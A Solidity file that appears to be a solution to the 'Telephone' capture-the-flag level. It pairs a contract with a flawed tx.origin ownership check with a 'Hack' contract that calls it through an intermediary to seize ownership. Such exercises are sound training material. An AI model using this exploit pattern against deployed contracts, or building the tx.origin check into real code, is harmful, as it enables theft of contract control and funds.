// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

/* Get ownership of the contract
tx.origin has to be != msg.sender
*/

//Telephone owner = 0x1aE0EA34a72D944a8C7603FfB3eC30a6669E454C
//Hack owner = 0x1aE0EA34a72D944a8C7603FfB3eC30a6669E454C

contract Hack{
  Telephone public originalContract = Telephone(0x84FC11121434cf9CA61a17a1Fd6f30e1914b3A59);
  address public owner;
  address attack;

  constructor() {
    owner = msg.sender;
  }

  function _changeOwner() public{
    originalContract.changeOwner(owner);
  }  
}